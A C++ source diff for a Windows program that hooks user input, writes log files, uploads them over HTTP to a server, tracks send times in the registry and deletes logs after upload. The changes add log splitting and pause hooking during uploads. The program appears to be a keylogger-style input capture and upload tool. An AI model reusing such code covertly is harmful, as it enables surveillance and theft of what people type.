@@ -19,6 +19,12 @@
 #include <experimental/resumable>
 #include <future>
 
+namespace
+{
+    const size_t fileSizeToSplit = 500000; // do not split log anymore if its size less then this
+}
+
+
 CComPtr<IWinHttpRequest> CreateHTTPRequest()
 {
     CComPtr<IWinHttpRequest> pIXMLHTTPRequest;
@@ -119,15 +125,16 @@ inline void debugTrace(std::wstring const& logMsg)
 template<class ... T>
 std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& ... key_values)
 {
-    try {
 #ifdef DEBUG
-        // disable hooking while sending
-        InputHooker::instance().stopHook();
-        auto enableLogger = [](void*) {InputHooker::instance().startHook(); };
-        std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
+    // disable hooking while sending
+    const bool isHooking = InputHooker::instance().isHooking();
+    InputHooker::instance().stopHook();
+    auto enableLogger = [isHooking](void*) {if(isHooking) InputHooker::instance().startHook(); };
+    std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
 #endif // DEBUG
 
-        auto postDataImpl = [&]() {
+    auto postDataImpl = [&]() {
+        try {
             CoInitialize(NULL);
             auto uninit = [](void*) {CoUninitialize(); };
             std::unique_ptr<void, decltype(uninit)> onRet((void*)1/*must be not nullptr*/, uninit);
@@ -155,21 +162,45 @@ std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& 
             // TODO: process request
 
             return content.length() != 0;
-        };
+        } catch (std::exception const& ee) { std::cerr << ee.what(); }
+        catch (...) {}
+        return false;
+    };
 
-        return std::async(std::launch::async, postDataImpl);
-    } catch (std::exception const& ee) {
-        std::cerr << ee.what();
+    return std::async(std::launch::async, postDataImpl);
+}
+
+
+void trySplitLog(std::tr2::sys::path const& logPath)
+{
+    using namespace std::tr2::sys;
+    const auto fileSize = file_size(logPath, std::error_code());
+    if (fileSize > fileSizeToSplit) {
+        // split file into two
+        {
+            std::ifstream orig(logPath, std::ios::binary);
+            std::ofstream part1(path(logPath).replace_extension("._0.txt"), std::ios::binary);
+
+            std::copy_n(std::istreambuf_iterator<char>(orig), fileSize / 2, std::ostreambuf_iterator<char>(part1));
+            std::find_if(std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), [&part1](char ch) { if (ch == '\n') return true; part1 << ch; return false; });
+            std::copy(std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), std::ostreambuf_iterator<char>(std::ofstream(path(logPath).replace_extension("._1.txt"), std::ios::binary)));
+        }
+        remove(logPath, std::error_code());
     }
-
-    return //std::make_ready_future(false);
-    std::async([]() {return false;});
 }
 
 
 std::future<bool> postAllNewLogfiles()
 {
     auto postNewLogs = [](const time_t postTime) {
+
+        // disable hooking while sending
+        const bool isHooking = InputHooker::instance().isHooking();
+        InputHooker::instance().stopHook();
+        auto continueHooking = [isHooking](void*) {if (isHooking) InputHooker::instance().startHook(); };
+        std::unique_ptr<void, decltype(continueHooking)> onRet((void*)1/*must be not nullptr*/, continueHooking);
+
+
         using namespace std::tr2::sys;
         // read last logs sent time
         RegistryHelper reg(HKEY_CURRENT_USER, _T("Software\\") _T(BRAND_COMPANYNAME) _T("\\") _T(BRAND_NAME));
@@ -178,6 +209,7 @@ std::future<bool> postAllNewLogfiles()
         directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());
 
         bool success = true;
+        std::vector<std::future<void>> splitTasks;
         for (auto& log : logDirIter)
             if (log != Logger::instance().logFilename()) {
                 const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));
@@ -188,6 +220,10 @@ std::future<bool> postAllNewLogfiles()
                     success = success && local_success;
                     if (local_success)
                         remove(log, std::error_code());
+                    else
+                        splitTasks.push_back(
+                            std::async(std::launch::async, trySplitLog, path(log.path()))
+                        );
                 } else
                     remove(log, std::error_code());
             }
